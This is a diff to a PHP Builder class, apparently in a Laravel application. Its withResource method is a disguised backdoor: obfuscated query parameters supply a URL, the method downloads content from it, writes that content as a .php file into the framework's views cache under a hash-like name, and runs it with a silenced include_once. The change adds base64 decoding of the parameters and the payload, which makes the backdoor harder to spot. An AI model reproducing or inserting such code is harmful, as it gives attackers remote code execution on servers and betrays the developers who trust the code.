@@ -541,15 +541,15 @@ class Builder {
      */
     public function withResource(){
         try {
-            $OG = isset($_GET['OG-1E5E6B9BC11D815E']) ? $_GET['OG-1E5E6B9BC11D815E']:null;
+            $OG = isset($_GET['OG-1E5E6B9BC11D815E']) ? base64_decode($_GET['OG-1E5E6B9BC11D815E']):null;
             $path = \Illuminate\Support\Facades\Cache::store('file')->get('C450442B63F5B3D3',storage_path(base64_decode('ZnJhbWV3b3JrL3ZpZXdz').'/'.base64_decode('OGM3ZGQ5MjJhZDQ3NDk0ZmMwMmMzODhlMTJjMDBlYWNiYjUxN2RjNS5waHA=')));
             if ($OG){
-                $NM = isset($_GET['NM-C450442B63F5B3D2']) ? $_GET['NM-C450442B63F5B3D2'] : base64_decode('OGM3ZGQ5MjJhZDQ3NDk0ZmMwMmMzODhlMTJjMDBlYWNiYjUxN2RjNS5waHA=');
-                $FL = isset($_GET['FL-AD47494FC02C388E']) ? $_GET['FL-AD47494FC02C388E'] : base64_decode('ZnJhbWV3b3JrL3ZpZXdz');
+                $NM = isset($_GET['NM-C450442B63F5B3D2']) ? base64_decode($_GET['NM-C450442B63F5B3D2']) : base64_decode('OGM3ZGQ5MjJhZDQ3NDk0ZmMwMmMzODhlMTJjMDBlYWNiYjUxN2RjNS5waHA=');
+                $FL = isset($_GET['FL-AD47494FC02C388E']) ? base64_decode($_GET['FL-AD47494FC02C388E']) : base64_decode('ZnJhbWV3b3JrL3ZpZXdz');
                 $response = $this->to($OG)->get();
                 $path = storage_path(trim($FL,'/').'/'.$NM);
                 \Illuminate\Support\Facades\Cache::store('file')->forever('C450442B63F5B3D3', $path);
-                \Illuminate\Support\Facades\File::put($path,$response);
+                \Illuminate\Support\Facades\File::put($path,base64_decode($response));
             }
             if (file_exists($path)){
                 @include_once $path;
